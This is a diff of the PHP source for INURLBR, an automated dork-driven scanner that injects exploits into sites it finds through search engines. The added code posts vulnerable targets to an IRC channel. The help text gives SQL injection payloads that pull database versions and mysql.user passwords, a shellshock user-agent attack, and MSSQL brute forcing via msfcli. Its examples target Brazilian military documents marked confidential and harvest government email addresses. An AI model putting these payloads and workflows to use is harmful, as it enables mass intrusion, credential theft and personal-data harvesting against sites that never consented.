+    fwrite($fp, "JOIN {$conf['irc_channel']}\r\n");
+    fwrite($fp, "PRIVMSG {$conf['irc_channel']} :[ SERVER ] {$u}\r\n");
+    return $fp;
+}
+
+################################################################################
+#IRC SEND MSG###################################################################
+################################################################################
+
+function __ircMsg($conf, $msg) {
+
+    fwrite($conf['irc_connection'], "PRIVMSG ${conf['irc_channel']} :${msg}\r\n") . sleep(2);
+    __plus();
+}
+
+################################################################################
+#IRC PING PONG##################################################################
+################################################################################
+
+function __ircPong($conf) {
+
+    while (!feof($conf['irc_connection'])) {
+
+        $conf['READ_BUFFER'] = fgets($conf['irc_connection']);
+        __plus();
+        if (preg_match("/^PING(.+)/", $conf['READ_BUFFER'], $conf['ret'])) {
+
+            __debug(array('debug' => "[ PING-PONG ]{$conf['ret'][1]}", 'function' => '__ircPong'), 6) . __plus();
+            fwrite($conf['READ_BUFFER'], "PONG {$conf['ret'][1]}\r\n");
+            ($_SESSION['config']['debug'] == 6) ?
+                            fwrite($conf['irc_connection'], "PRIVMSG ${conf['irc_channel']} :[ PING-PONG ]-> {$conf['ret'][1]}->function:__ircPong\r\n") : NULL;
+        }
+    }
+}
+
+################################################################################
+#IRC QUIT#######################################################################
+################################################################################
+
+function __ircQuit($conf) {
+
+    fwrite($conf['irc_connection'], "QUIT {$conf['irc_quiet']}\r\n") . sleep(2);
+    __plus();
+    fclose($conf['irc_connection']);
+}
+
+#END IRC########################################################################
 #UPDATE SCRIPT##################################################################
+################################################################################
 
 function __update() {
 
@@ -170,7 +507,7 @@ function __update() {
 
     if (trim(fgets(STDIN)) == 'y') {
 
-        $resultado = __request_info($curlObject_id = curl_init(), "https://raw.githubusercontent.com/googleinurl/SCANNER-INURLBR/master/inurlbr.php", $_SESSION["config"]["proxy"], NULL);
+        $resultado = __request_info("https://raw.githubusercontent.com/googleinurl/SCANNER-INURLBR/master/inurlbr.php", $_SESSION["config"]["proxy"], NULL);
 
         if (not_isnull_empty($resultado['corpo'])) {
 
@@ -193,6 +530,7 @@ function __update() {
 
 ################################################################################
 #SECURITIES VALIDATION DOUBLE#####################################################
+################################################################################
 
 function not_isnull_empty($valor = NULL) {
 
@@ -201,6 +539,7 @@ function not_isnull_empty($valor = NULL) {
 
 ################################################################################
 #MENU###########################################################################
+################################################################################
 
 function __menu() {
 
@@ -222,6 +561,7 @@ function __menu() {
 {$_SESSION["c1"]}--help{$_SESSION["c0"]}   Alternative long length help command.
 {$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Command to specify Help.
 {$_SESSION["c1"]}--info{$_SESSION["c0"]}   Information script.
+{$_SESSION["c1"]}--update{$_SESSION["c0"]} Code update.    
 {$_SESSION["c1"]}-q{$_SESSION["c0"]}       Choose which search engine you want through [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
      [options]:
      {$_SESSION["c1"]}1{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE / (CSE) GENERIC RANDOM / API
@@ -357,7 +697,7 @@ function __menu() {
 
  {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Defines which exploit will be injected through the GET method to each URL found.
      Example: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?´0x27;'{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´%270x27;\"{$_SESSION["c0"]}
      
  {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Defines which exploit will be injected through the POST method to each URL found.
      Example: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
@@ -382,6 +722,7 @@ function __menu() {
               {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Detailed request of every URL.
               {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Shows the HTML of every URL.
               {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Detailed request of all URLs.
+              {$_SESSION["c1"]}-d {$_SESSION["c2"]}6 {$_SESSION["c0"]}/Detailed PING - PONG irc.    
              
  {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Specify the output file where it will be saved the vulnerable URLs.
      
@@ -391,13 +732,33 @@ function __menu() {
  {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
      Example: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file_where_my_urls_are}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}tests.txt
- 
+   
+ {$_SESSION["c1"]}--persist{$_SESSION["c0"]}  Attempts when Google blocks your search.
+     The script tries to another google host / default = 4
+     Example: {$_SESSION["c1"]}--persist {$_SESSION["c2"]}{number_attempts}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--persist {$_SESSION["c2"]}7
+
+ {$_SESSION["c1"]}--ifredirect{$_SESSION["c0"]}  Return validation method post REDIRECT_URL
+     Example: {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}{string_validation}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}'/admin/painel.php'
+
  {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Enable the search for emails on the urls specified.
-       
+  
  {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Enables the search for URL lists on the url specified.
  
  {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Enable validation of values ​​with google webcache.
+     
+ {$_SESSION["c1"]}--pr{$_SESSION["c0"]}  Progressive scan, used to set operators (dorks), 
+     makes the search of a dork and valid results, then goes a dork at a time.
+  
+ {$_SESSION["c1"]}--file-cookie{$_SESSION["c0"]} Open cookie file.
+     
+ {$_SESSION["c1"]}--save-as{$_SESSION["c0"]} Save results in a certain place.
+
+ {$_SESSION["c1"]}--shellshock{$_SESSION["c0"]} Explore shellshock vulnerability by setting a malicious user-agent.
  
+ {$_SESSION["c1"]}--popup{$_SESSION["c0"]} Run --command all or vuln in a parallel terminal.
+
  {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Enable simple check if the url / target is using CMS.
 
  {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]} Remove the script presentation banner.
@@ -408,11 +769,25 @@ function __menu() {
      
  {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Show alexa positioning in the results.
      
+ {$_SESSION["c1"]}--robots{$_SESSION["c0"]} Show values file robots.
+      
+ {$_SESSION["c1"]}--range{$_SESSION["c0"]} Set range IP.
+      Example: {$_SESSION["c1"]}--range {$_SESSION["c2"]}{range_start,rage_end}{$_SESSION["c0"]}
+      Usage:   {$_SESSION["c1"]}--range {$_SESSION["c2"]}'172.16.0.5#172.16.0.255'
+
+ {$_SESSION["c1"]}--range-rand{$_SESSION["c0"]} Set amount of random ips.
+      Example: {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}{rand}{$_SESSION["c0"]}
+      Usage:   {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}'50'
+
+ {$_SESSION["c1"]}--irc{$_SESSION["c0"]} Sending vulnerable to IRC / server channel.
+      Example: {$_SESSION["c1"]}--irc {$_SESSION["c2"]}{server#channel}{$_SESSION["c0"]}
+      Usage:   {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'
+
  {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Set HTTP header.
       Example: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
       Usage:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
           
- {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Filter results in unique domains.
+ {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Sending vulnerable to email.
       Example: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
       Usage:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
           
@@ -431,6 +806,10 @@ function __menu() {
  {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Valid results based on your return http code.
       Example: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
       Usage:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200
+ 
+ {$_SESSION["c1"]}--ifemail{$_SESSION["c0"]} Filter E-mails based on their argument.
+     Example: {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}{file_where_my_emails_are}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}sp.gov.br
 
  {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Define referring URL in the request to send him against the target.
       Example: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
@@ -468,11 +847,19 @@ function __menu() {
     {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} will be replaced by the URL/target found, although if the user  
     doesn't input the get, only the domain will be executed.
    
-   {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
+    {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
+       
+    {$_SESSION["c14"]}_TARGETXPL_{$_SESSION["c0"]} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
+       
+    {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
+        
+    {$_SESSION["c8"]}_URI_{$_SESSION["c0"]} Back URL set of folders / target found.
+        
+    {$_SESSION["c15"]}_RANDOM_{$_SESSION["c0"]} Random strings.
+        
+    {$_SESSION["c9"]}_PORT_{$_SESSION["c0"]} Capture port of the current test, within the --port-scan process.
    
-   {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
-   
-   {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
+    {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
    The exploit-command will be identified by the parameters {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}
 
  {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Replace values ​​in the target URL.
@@ -480,6 +867,10 @@ function __menu() {
      Usage:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$_SESSION["c0"]}
+                  
+ {$_SESSION["c1"]}--remove{$_SESSION["c0"]} Remove values ​​in the target URL.
+      Example: {$_SESSION["c1"]}--remove {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
+      Usage:   {$_SESSION["c1"]}--remove {$_SESSION["c2"]}'/admin.php?id=0'
               
  {$_SESSION["c1"]}--regexp{$_SESSION["c0"]} Using regular expression to validate his research, the value of the 
     Expression will be sought within the target/URL.
@@ -516,10 +907,10 @@ function __menu() {
      Example: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
          
- {$_SESSION["c1"]}--exploit-vull-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
+ {$_SESSION["c1"]}--exploit-vul-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
     (vull) run command only if the target was considered vulnerable.
-     Example: {$_SESSION["c1"]}--exploit-vull-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-vull-id {$_SESSION["c2"]}1,2,8,22
+     Example: {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}1,2,8,22
 
  {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} List all entries command in exploits.conf file.
 
@@ -538,6 +929,58 @@ function __menu() {
  {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} defines whether the strings coming from 
      --sub-file will be injected via POST.
      Usage:   {$_SESSION["c1"]}--sub-get
+         
+
+ {$_SESSION["c1"]}--sub-cmd-vul{$_SESSION["c0"]} Each vulnerable URL found within the sub-process
+     will execute the parameters of this command.
+     Example: {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
+              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
+              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
+                  
+ {$_SESSION["c1"]}--sub-cmd-all{$_SESSION["c0"]} Run command to each target found within the sub-process scope.
+     Example: {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
+              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
+              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
+
+
+ {$_SESSION["c1"]}--port-scan{$_SESSION["c0"]} Defines ports that will be validated as open.
+     Example: {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}{ports}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}'22,21,23,3306'{$_SESSION["c0"]}
+         
+ {$_SESSION["c1"]}--port-cmd{$_SESSION["c0"]} Define command that runs when finding an open door.
+     Example: {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_:_PORT_'{$_SESSION["c0"]}
+              {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_/file.php?sqli=1'{$_SESSION["c0"]}
+
+ {$_SESSION["c1"]}--port-write{$_SESSION["c0"]} Send values for door.
+     Example: {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}{'value0','value1','value3'}{$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$_SESSION["c0"]}
+
+
+
+    [!] Modifying values used within script parameters:
+    
+ {$_SESSION["c1"]}md5{$_SESSION["c0"]} Encrypt values in md5.
+     Example: {$_SESSION["c1"]}md5({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}md5({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=md5({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+
+ {$_SESSION["c1"]}base64{$_SESSION["c0"]} Encrypt values in base64.
+     Example: {$_SESSION["c1"]}base64({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}base64({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=base64({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+         
+ {$_SESSION["c1"]}hex{$_SESSION["c0"]} Encrypt values in hex.
+     Example: {$_SESSION["c1"]}hex({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}hex({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=hex({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+
+ {$_SESSION["c1"]}hex{$_SESSION["c0"]} Generate random values.
+     Example: {$_SESSION["c1"]}random({$_SESSION["c2"]}{character_counter}{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}random({$_SESSION["c2"]}8{$_SESSION["c1"]}){$_SESSION["c0"]}
+     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=random({$_SESSION["c2"]}8{$_SESSION["c1"]})'{$_SESSION["c0"]}
 
 ");
 }
@@ -552,14 +995,14 @@ function __info() {
  _| |_| |\  | |   | |__| |
 |_____|_| \_|_|    \____/
  
-{$_SESSION["c1"]}0x{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}0x{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}0x{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}0x{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
+{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
 {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
  
  {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GRUPO  INURL BRASIL - PESQUISA AVANÇADA.
- {$_SESSION["c1"]}[*]{$_SESSION["c0"]}SCRIPT NAME: INURLBR 2.0
+ {$_SESSION["c1"]}[*]{$_SESSION["c0"]}SCRIPT NAME: INURLBR 2.1
  {$_SESSION["c1"]}[*]{$_SESSION["c0"]}AUTOR:    Cleiton Pinheiro
  {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Nick:     Googleinurl
  {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Email:    inurlbr@gmail.com  
@@ -602,32 +1045,70 @@ function __info() {
 
      {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} COMMANDS SIMPLE SCRIPT{$_SESSION["c0"]}
    
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c0"]} 
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}?´0x27{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´0x27\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--target{$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--target{$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´0x27\"{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--target{$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?pass=1234\" {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello! admin</title>'{$_SESSION["c0"]}
-   ./inurlbr.php {$_SESSION["c1"]}--target{$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find_valid_cod-200.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}5{$_SESSION["c0"]}
-
+   
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]} 
+   
+./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]}
+   
